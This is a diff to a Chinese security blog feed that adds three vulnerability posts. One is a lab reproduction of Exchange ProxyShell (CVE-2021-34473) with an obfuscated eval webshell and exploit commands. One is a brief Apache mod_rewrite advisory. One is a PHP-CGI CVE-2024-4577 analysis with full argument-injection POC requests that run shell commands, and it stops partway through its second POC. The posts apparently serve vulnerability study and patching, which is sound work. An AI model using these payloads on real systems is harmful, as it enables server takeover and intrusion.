@@ -10,9 +10,508 @@
         </author>
         <description>CygneNoir</description>
         <language>zh-HK</language>
-        <pubDate>Mon, 12 Aug 2024 14:05:14 +0800</pubDate>
-        <lastBuildDate>Mon, 12 Aug 2024 14:05:14 +0800</lastBuildDate>
+        <pubDate>Tue, 13 Aug 2024 14:32:37 +0800</pubDate>
+        <lastBuildDate>Tue, 13 Aug 2024 14:32:37 +0800</lastBuildDate>
         <category term="CygneNoir" />
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/13/CVE/Microsoft%20Exchange%20Server/Microsoft%20Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-34473/</guid>
+            <title>Microsoft Exchange Server 远程代码执行漏洞 CVE-2021-34473</title>
+            <link>http://example.com/2024/08/13/CVE/Microsoft%20Exchange%20Server/Microsoft%20Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-34473/</link>
+            <category term="CVE" scheme="http://example.com/categories/CVE/" />
+            <category term="Exchange" scheme="http://example.com/categories/CVE/Exchange/" />
+            <category term="CVE" scheme="http://example.com/tags/CVE/" />
+            <category term="Exchange" scheme="http://example.com/tags/Exchange/" />
+            <pubDate>Tue, 13 Aug 2024 14:32:37 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Colin.B&#34; style=&#34;--block-color:#3d97cb;&#34;&gt;&lt;a href=&#34;https://www.cnblogs.com/colin-B/p/15783751.html&#34; class=&#34;image&#34; data-background-image=&#34;/assets/404.png&#34;&gt;&lt;/a&gt;
+        &lt;div class=&#34;info&#34;&gt;
+        &lt;a href=&#34;https://www.cnblogs.com/colin-B/p/15783751.html&#34; class=&#34;title&#34;&gt;Microsoft Exchange Server 远程代码执行漏洞 CVE-2021-34473&lt;/a&gt;
+        &lt;p class=&#34;desc&#34;&gt;Microsoft Exchange Server 远程代码执行漏洞 CVE-2021-34473&lt;/p&gt;
+        &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;h1 id=&#34;背景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#背景&#34;&gt;#&lt;/a&gt; 背景：&lt;/h1&gt;
+&lt;p&gt;2021 年 8 月 5 日，安全研究员在国外安全会议上公开了 CVE-2021-34473 Microsoft Exchange Server 远程代码执行漏洞分析及其 POC。攻击者利用该漏洞可绕过相关权限验证，进而配合其他漏洞可执行任意代码，控制 Microsoft Exchange Server。&lt;/p&gt;
+&lt;h1 id=&#34;漏洞编号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞编号&#34;&gt;#&lt;/a&gt; 漏洞编号：&lt;/h1&gt;
+&lt;p&gt;CVE-2021-34473&lt;/p&gt;
+&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#影响版本&#34;&gt;#&lt;/a&gt; 影响版本：&lt;/h1&gt;
+&lt;p&gt;Microsoft Exchange Server 2010&lt;br /&gt;
+Microsoft Exchange Server 2013&lt;br /&gt;
+Microsoft Exchange Server 2016&lt;br /&gt;
+Microsoft Exchange Server 2019&lt;/p&gt;
+&lt;h1 id=&#34;环境搭建内存要-8-g&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境搭建内存要-8-g&#34;&gt;#&lt;/a&gt; 环境搭建：（内存要 8 G）&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;安装 AD 域控，打开服务器管理器，点击管理 &amp;gt; 添加角色和功能（Windows Server 2016）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112621787-1309042725.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;选择 Active Directory 域服务 和 DNS 服务器&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112631899-812590048.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112638587-28254034.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;打开服务器管理器，将此服务器提升为域控制器&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112651600-1574068446.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112700523-902989138.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;设置一个密码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112712174-2045395043.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;点击安装，安装完成后系统会自动重启&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112725096-633410943.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;安装 Exchange 依赖组件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;NET Framework 4.8&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;a href=&#34;https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe&#34;&gt;https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe&lt;/a&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;安装 Visual C++w Redistributable Package for Visual Studio 2012&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/download/details.aspx?id=30679&#34;&gt;https://www.microsoft.com/en-us/download/details.aspx?id=30679&lt;/a&gt;&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Visual C++ 2013 Redistributable Package&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;a href=&#34;https://support.microsoft.com/zh-cn/topic/update-for-visual-c-2013-redistributable-package-d8ccd6a5-4e26-c290-517b-8da6cfdf4f10&#34;&gt;https://support.microsoft.com/zh-cn/topic/update-for-visual-c-2013-redistributable-package-d8ccd6a5-4e26-c290-517b-8da6cfdf4f10&lt;/a&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;通过 Power Shell 安装 Exchange 必备的 Windows 组件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;Install-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112804487-823020389.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;然后下载 exchange 2016 ios:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;a href=&#34;https://download.microsoft.com/download/d/2/3/d23b113b-9634-4456-acba-1f7b0ce22b0e/ExchangeServer2016-x64-cu18.iso&#34;&gt;https://download.microsoft.com/download/d/2/3/d23b113b-9634-4456-acba-1f7b0ce22b0e/ExchangeServer2016-x64-cu18.iso&lt;/a&gt;&lt;/p&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;安装 Exchange 右键以管理员身份运行&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112900726-1272008777.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;8&#34;&gt;
+&lt;li&gt;选择不检查更新&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112913124-266570428.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;9&#34;&gt;
+&lt;li&gt;选择邮箱角色&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112922840-23763588.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;10&#34;&gt;
+&lt;li&gt;禁用恶意软件扫描&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112934126-206341780.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;11&#34;&gt;
+&lt;li&gt;根据错误提示点击链接修复错误（两个错误）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112943788-1814529483.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;12&#34;&gt;
+&lt;li&gt;安装完成登录&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110112954670-1912884260.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;复现步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现步骤&#34;&gt;#&lt;/a&gt; 复现步骤：&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;生成一个 webshell，&lt;a href=&#34;https://github.com/Ridter/proxyshell_payload&#34;&gt;https://github.com/Ridter/proxyshell_payload&lt;/a&gt; ，在 proxyshell_payload.py 中，修改末尾的 webshell 变量，将其替换为蚁剑的 webshell&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;更改前：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113011144-644259436.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;更改后：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113020806-403518532.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&#39;&amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot; Debug=true%&amp;gt;&amp;lt;%var NNVF=\&#39;dFUwlmztVCSLYeHkDMgEZrKWhjQBNsuiGnf0xJPqAcvbIopXyaTR\&#39;;var NURV=Request.Form(&amp;quot;mima&amp;quot;);var FASZ=NNVF(2) + NNVF(28) + NNVF(10) + NNVF(40) + NNVF(1) + NNVF(13);eval(NURV, FASZ);%&amp;gt;&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;运行后：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113043569-1713284144.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;下载 exp，&lt;a href=&#34;https://github.com/dmaasland/proxyshell-poc%E7%BC%96%E8%BE%91proxyshell_rce.py%E5%B0%86%E4%B8%8A%E4%B8%80%E6%AD%A5Encode&#34;&gt;https://github.com/dmaasland/proxyshell-poc 编辑 proxyshell_rce.py 将上一步 Encode&lt;/a&gt; webshell 执行结果粘贴到 314 行&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113105916-227131001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;执行 python proxyshell_rce.py -u &lt;a href=&#34;https://x.x.x.x/&#34;&gt;https://x.x.x.x/&lt;/a&gt; -e &lt;a href=&#34;mailto:administrator@xxx.com&#34;&gt;administrator@xxx.com&lt;/a&gt;（最后这个邮箱必须为目标邮箱管理组的邮箱用户名，一般 administrator 都在）执行这步的时候会报错缺少 pypsrp 模块，安装即可：pip install pypsrp&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113121540-550994475.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113128458-193961320.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;依次执行下面 3 条命令&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;① Get-MailboxExportRequest&lt;/p&gt;
+&lt;p&gt;② Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113145665-1578245047.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;③ dropshell&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113156716-10262506.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;上传成功后使用蚁剑连接 webshell，连接目标为上一步执行完最后得出的 shell url 地址，密码为 mima&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113208681-278174964.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113214156-203223075.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113222064-409114946.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;勾选忽略 HTTPS 证书&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113231413-603961394.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;连接成功&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2020.cnblogs.com/blog/1460996/202201/1460996-20220110113242719-95420648.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/13/CVE/Apache/Apache%20HTTP%20Server%20mod_rewrite%20%E8%BE%93%E5%87%BA%E4%B8%8D%E5%BD%93%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2024-38475/</guid>
+            <title>Apache HTTP Server mod_rewrite输出不当逃逸漏洞 CVE-2024-38475</title>
+            <link>http://example.com/2024/08/13/CVE/Apache/Apache%20HTTP%20Server%20mod_rewrite%20%E8%BE%93%E5%87%BA%E4%B8%8D%E5%BD%93%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2024-38475/</link>
+            <category term="CVE" scheme="http://example.com/categories/CVE/" />
+            <category term="Apache" scheme="http://example.com/categories/CVE/Apache/" />
+            <category term="CVE" scheme="http://example.com/tags/CVE/" />
+            <category term="Apache" scheme="http://example.com/tags/Apache/" />
+            <pubDate>Tue, 13 Aug 2024 14:30:41 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;2024 年 7 月 1 日，网上公开披露了一个 Apache HTTP Server mod_rewrite 输出不当逃逸漏洞 (CVE-2024-38475)，Apache HTTP Server 是美国阿帕奇（Apache）基金会的一款开源网页服务器，请各位用户尽快安装漏洞补丁。&lt;/p&gt;
+&lt;p&gt;** 漏洞风险：**Apache HTTP Server 2.4.59 及更早版本中 mod_rewrite 模块在处理 URL 重写时，如果使用反向引用或变量作为替换的第一部分，可能会导致输出转义不当，攻击者可借助此漏洞将 URL 映射到不应该被用户访问的文件系统位置，从而导致代码执行或源代码泄露。修复版本中通过默认禁用掉不安全的重写规则，增加 UnsafePrefixStat 选项来修复该漏洞。&lt;/p&gt;
+&lt;p&gt;** 风险等级：** 高风险。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;影响范围：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;2.4.0 &amp;lt;= Apache HTTP Server &amp;lt;= 2.4.59&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;修复建议：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;目前官方已有可更新版本，建议受影响用户升级至最新版本&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;进行安全更新方法：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://httpd.apache.org/download.cgi&#34;&gt;https://httpd.apache.org/download.cgi&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/08/13/CVE/PHP/PHP-CGI%20%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2024-4577/</guid>
+            <title>PHP-CGI 参数注入漏洞 CVE-2024-4577</title>
+            <link>http://example.com/2024/08/13/CVE/PHP/PHP-CGI%20%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2024-4577/</link>
+            <category term="CVE" scheme="http://example.com/categories/CVE/" />
+            <category term="PHP" scheme="http://example.com/categories/CVE/PHP/" />
+            <category term="CVE" scheme="http://example.com/tags/CVE/" />
+            <category term="PHP" scheme="http://example.com/tags/PHP/" />
+            <pubDate>Tue, 13 Aug 2024 11:40:59 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;本文分析了由 DEVCORE 团队研究发现的 PHP CGI 在 Windows 平台的远程代码执行漏洞（CVE-2024-4577），探讨了漏洞的技术细节、背景、利用条件以及修复建议。PHP 官方团队已于 2024 年 6 月 6 日发布了新版本修复 CVE-2024-4577，该漏洞利用前置条件较低且危害较大，建议尽快升级到安全版本。&lt;/p&gt;
+&lt;h1 id=&#34;x00-漏洞概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x00-漏洞概述&#34;&gt;#&lt;/a&gt; x00 漏洞概述&lt;/h1&gt;
+&lt;p&gt;CVE-2024-4577 是一个影响在 Windows 平台上运行的 PHP CGI 的远程代码执行漏洞。&lt;/p&gt;
+&lt;p&gt;漏洞的存在是因为 PHP 在设计时未能预见到 Windows 的 Best-Fit 字符编码转换特性，这使得攻击者可以通过构造特定的请求来绕过安全限制。受影响的环境包括使用特定语系设置的 Windows 系统，如简体中文（936）、繁体中文（950）和日文（932）。&lt;/p&gt;
+&lt;h1 id=&#34;x01-影响范围&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x01-影响范围&#34;&gt;#&lt;/a&gt; x01 影响范围&lt;/h1&gt;
+&lt;p&gt;PHP 8.3 &amp;lt; 8.3.8&lt;/p&gt;
+&lt;p&gt;PHP 8.2 &amp;lt; 8.2.20&lt;/p&gt;
+&lt;p&gt;PHP 8.1 &amp;lt; 8.1.29&lt;/p&gt;
+&lt;p&gt;其他版本的 PHP 官方已不在维护，建议根据实际情况升级到安全版本或者关闭 php-cgi 的使用。&lt;/p&gt;
+&lt;h1 id=&#34;x02-复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x02-复现&#34;&gt;#&lt;/a&gt; x02 复现&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;1、漏洞环境，选择 xampp_php/8.1.25&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://pic3.zhimg.com/80/v2-5daf6661b7b09429b566a14110d5b6ee_720w.webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;2、复现详情&lt;/p&gt;
+&lt;p&gt;poc1：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Host: PhpServerHost&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Encoding: gzip, deflate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Connection: close&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Upgrade-Insecure-Requests: 1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Type: application/x-www-form-urlencoded&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content-Length: 31&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;?php echo shell_exec(&#39;dir&#39;);?&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查询参数：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;查询参数会变成：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-d cgi.force_redirect=XCANWIN -d allow_url_include=on -d auto_prepend_file=php://input&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在该查询参数中 cgi.force_redirect 是 PHP 的一个配置指令，用于控制 PHP CGI 模式下的请求重定向行为。默认情况下，这个指令被设置为 1（即开启），在此处该指令设置为 XCANWIN，表示已经通过了某种安全机制。将包含远程文件的函数 allow_url_include 设置为 on，auto_prepend_file 允许每个请求之前必须尝试从 php://input 读取数据并将其作为代码执行。&lt;br /&gt;
+复现结果：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://pic4.zhimg.com/80/v2-991b4d35f8cee4517cf7ec0f55db3017_720w.webp&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Poc2：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;figcaption data-lang=&#34;text&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;POST /php-cgi/php-cgi.exe?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Host: PhpServerHost&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;REDIRECT-STATUS: XCANWIN&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Accept-Encoding: gzip, deflate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Connection: close&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 